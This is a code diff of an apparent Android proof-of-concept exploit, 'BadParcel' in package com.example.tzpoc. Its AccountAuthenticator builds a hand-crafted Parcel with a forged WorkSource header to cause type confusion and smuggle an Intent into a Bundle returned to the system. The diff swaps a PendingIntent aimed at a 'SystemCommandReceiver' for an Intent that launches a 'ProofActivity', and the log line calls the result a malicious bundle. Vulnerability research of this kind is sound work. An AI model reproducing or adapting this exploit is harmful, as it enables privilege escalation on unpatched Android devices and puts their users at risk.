@@ -4,21 +4,18 @@ import android.accounts.AbstractAccountAuthenticator;
 import android.accounts.Account;
 import android.accounts.AccountAuthenticatorResponse;
 import android.accounts.NetworkErrorException;
-import android.app.PendingIntent;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Parcel;
+import android.provider.Settings;
 import android.util.Log;
 
 public class MyAuthenticator extends AbstractAccountAuthenticator {
 
-    private final Context mContext; // 明示的に保持
-
     public MyAuthenticator(Context context) {
         super(context);
-        this.mContext = context; // ここで保持
     }
 
     @Override
@@ -32,16 +29,11 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
             throws NetworkErrorException {
         final String TAG = "BadParcel";
 
-        // ---- システム権限で実行されるPendingIntentを作成 ----
-        Intent receiverIntent = new Intent();
-        receiverIntent.setComponent(new ComponentName("com.example.tzpoc",
-                "com.example.tzpoc.SystemCommandReceiver"));
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(
-                this.mContext,  // 保持したContextを使用
-                0,
-                receiverIntent,
-                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
-        );
+        // ---- BadParcel: ProofActivity を起動するIntent ----
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.example.tzpoc",
+                "com.example.tzpoc.ProofActivity"));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         // ----
 
         Bundle bundle = new Bundle();
@@ -49,7 +41,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         Parcel obtain2 = Parcel.obtain();
         Parcel obtain3 = Parcel.obtain();
 
-        // 1) 細工したWorkSourceヘッダー
+        // WorkSource ヘッダー (型混淆用)
         obtain2.writeInt(3);
         obtain2.writeInt(13);
         obtain2.writeInt(2);
@@ -87,12 +79,12 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         obtain2.writeInt(13);
         obtain2.writeInt(-1);
 
-        // 2) キー "intent" に PendingIntent を埋め込む（型混淆のターゲット）
+        // "intent" キーに Intent を埋め込む
         int dataPosition = obtain2.dataPosition();
         obtain2.writeString("intent");
         obtain2.writeInt(4);  // PARCELABLE
-        obtain2.writeString("android.app.PendingIntent");
-        pendingIntent.writeToParcel(obtain3, 0);
+        obtain2.writeString("android.content.Intent");
+        intent.writeToParcel(obtain3, 0);
         obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
 
         int dataPosition2 = obtain2.dataPosition();
@@ -113,7 +105,6 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
             Log.d(TAG, "Bundle created successfully");
         } catch (Exception e) {
             Log.e(TAG, "Failed to read parcel: " + e.getMessage());
-            // クラッシュ回避のため空のBundleを返す
             return new Bundle();
         }
 
@@ -121,7 +112,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         obtain2.recycle();
         obtain3.recycle();
 
-        Log.i(TAG, "Returning malicious bundle with PendingIntent");
+        Log.i(TAG, "Returning malicious bundle with Intent");
         return bundle;
     }
 
